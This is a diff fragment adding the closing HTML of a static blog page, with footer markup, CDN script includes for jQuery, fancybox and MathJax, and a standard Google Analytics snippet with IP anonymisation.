+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
